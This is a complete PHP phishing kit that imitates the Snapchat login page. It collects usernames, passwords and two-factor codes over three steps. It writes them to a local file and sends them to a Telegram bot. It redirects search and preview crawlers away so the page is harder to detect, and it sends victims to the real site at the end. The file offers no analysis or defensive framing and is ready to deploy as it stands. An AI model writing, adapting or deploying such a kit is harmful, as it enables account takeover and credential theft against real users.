<?php
$STORE = (getenv('STORE_DIR') ?: '/tmp') . '/creds.jsonl';
@mkdir(dirname($STORE), 0755, true);
$TG_T = getenv('TG_TOKEN'); $TG_C = getenv('TG_CHAT');

if (preg_match('/Googlebot|bingbot|facebookexternalhit|Slackbot|Twitterbot|Applebot|DuckDuckBot/i',
               $_SERVER['HTTP_USER_AGENT'] ?? '')) {
    header('Location: https://www.snapchat.com/'); exit;
}

function logline($kind, $val) {
    global $STORE, $TG_T, $TG_C;
    $val = str_replace(["\t", "\n"], ' ', $val);
    @file_put_contents($STORE, implode("\t", [
        date('H:i:s'), $_SERVER['REMOTE_ADDR'] ?? '-', $kind, $val,
        substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 80),
    ]) . "\n", FILE_APPEND | LOCK_EX);

    if ($TG_T && $TG_C) {
        @file_get_contents("https://api.telegram.org/bot$TG_T/sendMessage?" . http_build_query([
            'chat_id' => $TG_C,
            'text' => "<b>$kind</b>\n<code>" . htmlspecialchars($val) . "</code>\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? '-'),
            'parse_mode' => 'HTML',
        ]), false, stream_context_create(['http' => ['timeout' => 4]]));
    }
}

$view = 'user';
$pending = '';
$step = $_POST['step'] ?? null;

if ($step === '1') {
    $u = trim($_POST['u'] ?? '');
    if ($u === '') { header('Location: /'); exit; }
    logline('USER', $u);
    $pending = $u; $view = 'pw';
} elseif ($step === '2') {
    logline('PASS', $_POST['p'] ?? '');
    $pending = trim($_POST['u'] ?? '');
    $view = 'code';
} elseif ($step === '3') {
    logline('CODE', $_POST['c'] ?? '');
    header('Location: https://web.snapchat.com/'); exit;
}
?>
<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Snapchat</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
       display:flex;justify-content:center;padding:56px 24px 40px;min-height:100vh}
  .card{width:100%;max-width:360px}
  .ghost{display:block;margin:0 auto 28px}
  h1{font-size:22px;font-weight:600;text-align:center;margin:0 0 8px;color:#000}
  .sub{font-size:14px;color:#737373;text-align:center;margin:0 0 26px}
  input{width:100%;padding:14px;border-radius:8px;border:1px solid #d8d8d8;background:#fff;
        color:#000;font-size:16px;margin-bottom:12px;outline:none}
  input:focus{border-color:#000}
  button{width:100%;padding:15px;border-radius:26px;border:0;background:#FFFC00;color:#000;
         font-size:16px;font-weight:600;cursor:pointer}
  .pill{display:inline-block;font-size:13px;background:#f5f5f5;border-radius:20px;
        padding:6px 12px;margin-bottom:18px;color:#000}
  .forgot{text-align:center;font-size:13px;color:#737373;margin-top:18px}
</style></head>
<body>
<div class="card">
  <svg class="ghost" width="60" height="60" viewBox="0 0 24 24" fill="#FFFC00" stroke="none"
       stroke-width="0.9" stroke-linejoin="round"><path d="M12 2c3.2 0 5.2 2.2 5.2 5.4 0 .9-.1 1.7-.2 2.4.5.2 1 .1 1.4-.1.7-.3 1.3.5.9 1.1-.4.7-1.3 1-2.1 1.1.3.7 1 1.4 1.8 1.9.5.3.3.9-.2 1.1-.9.3-1.7.4-2.2 1.2-.3.5-.8.5-1.4.4-.7-.1-1.4-.2-2.1-.2-1 0-1.6.3-2.2.7-.6.4-1.2.7-2 .5-.7-.2-1.1-.7-1.4-1.2-.4-.8-1.2-.9-2.1-1.2-.5-.2-.7-.8-.2-1.1.8-.5 1.5-1.2 1.8-1.9-.8-.1-1.7-.4-2.1-1.1-.4-.6.2-1.4.9-1.1.4.2.9.3 1.4.1-.1-.7-.2-1.5-.2-2.4C6.8 4.2 8.8 2 12 2z"/></svg>

  <?php if ($view === 'pw'): ?>
    <span class="pill">@<?= htmlspecialchars($pending) ?></span>
    <form method="post" autocomplete="off">
      <input type="hidden" name="step" value="2">
      <input type="hidden" name="u" value="<?= htmlspecialchars($pending) ?>">
      <input name="p" type="password" placeholder="Password" autofocus required>
      <button>Log in</button>
    </form>
    <p class="forgot">Forgot password?</p>
  <?php elseif ($view === 'code'): ?>
    <h1>Verify it's you</h1>
    <p class="sub">Enter the 6-digit code we sent to your phone</p>
    <form method="post" autocomplete="one-time-code">
      <input type="hidden" name="step" value="3">
      <input type="hidden" name="u" value="<?= htmlspecialchars($pending) ?>">
      <input name="c" inputmode="numeric" pattern="[0-9]*" maxlength="6"
             placeholder="6-digit code" autofocus required>
      <button>Continue</button>
    </form>
  <?php else: ?>
    <h1>Log in to Snapchat</h1>
    <p class="sub">Use your username or email</p>
    <form method="post">
      <input type="hidden" name="step" value="1">
      <input name="u" placeholder="Username or email" autofocus required
             autocapitalize="none" autocorrect="off">
      <button>Continue</button>
    </form>
    <p class="forgot">Forgot password?</p>
  <?php endif; ?>
</div>
</body></html>
